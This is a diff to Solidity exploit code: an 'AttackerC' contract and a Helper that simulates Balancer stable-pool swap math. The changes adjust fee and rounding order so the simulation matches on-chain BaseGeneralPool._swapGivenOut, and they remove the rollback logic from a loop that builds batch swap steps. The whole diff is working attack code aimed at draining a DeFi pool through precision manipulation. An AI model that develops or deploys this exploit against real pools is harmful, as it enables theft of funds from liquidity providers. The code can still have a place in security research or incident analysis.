@@ -83,11 +83,12 @@ contract Helper {
             amountOutScaled,
             invariant
         );
+        // Downscale first (round up), then add fee — matches on-chain BaseGeneralPool._swapGivenOut
         uint256 rawAmountIn = FixedPoint.divUp(amountInScaled, scalingFactors[tokenIndexIn]);
-        uint256 amountInWithFee = FixedPoint.divUp(rawAmountIn, FixedPoint.ONE.sub(swapFee));
+        rawAmountIn = FixedPoint.divUp(rawAmountIn, FixedPoint.ONE.sub(swapFee));
 
         balances[tokenIndexOut] = balances[tokenIndexOut].sub(tokenAmountOut);
-        balances[tokenIndexIn] = balances[tokenIndexIn].add(amountInWithFee);
+        balances[tokenIndexIn] = balances[tokenIndexIn].add(rawAmountIn);
         
         return balances;
     }
@@ -254,30 +255,21 @@ contract AttackerC {
                 userData: bytes("")
             });
             amount = helper.trim(balances[tokenIndexIn]);
-            {
-                bool swap3ok = false;
-                for (uint256 j = 0; j < 3; ++j) {
-                    try helper.swapGivenOut(balances, scalingFactors, tokenIndexOut, tokenIndexIn, amount, amplificationParameter, swapFee) returns (uint256[] memory newBalances) {
-                        buffer[stepCount++] = IBalancerVault.BatchSwapStep({
-                            poolId: poolId,
-                            assetInIndex: indexOut,
-                            assetOutIndex: indexIn,
-                            amount: amount,
-                            userData: bytes("")
-                        });
-                        balances = newBalances;
-                        amount = balances[tokenIndexOut];
-                        swap3ok = true;
-                        break;
-                    } catch {
-                        amount = (amount * 9) / 10;
-                        continue;
-                    }
-                }
-                if (!swap3ok) {
-                    // Rollback the swap1+swap2 steps from this failed round
-                    stepCount -= 2;
+            for (uint256 j = 0; j < 3; ++j) {
+                try helper.swapGivenOut(balances, scalingFactors, tokenIndexOut, tokenIndexIn, amount, amplificationParameter, swapFee) returns (uint256[] memory newBalances) {
+                    buffer[stepCount++] = IBalancerVault.BatchSwapStep({
+                        poolId: poolId,
+                        assetInIndex: indexOut,
+                        assetOutIndex: indexIn,
+                        amount: amount,
+                        userData: bytes("")
+                    });
+                    balances = newBalances;
+                    amount = balances[tokenIndexOut];
                     break;
+                } catch {
+                    amount = (amount * 9) / 10;
+                    continue;
                 }
             }
         }
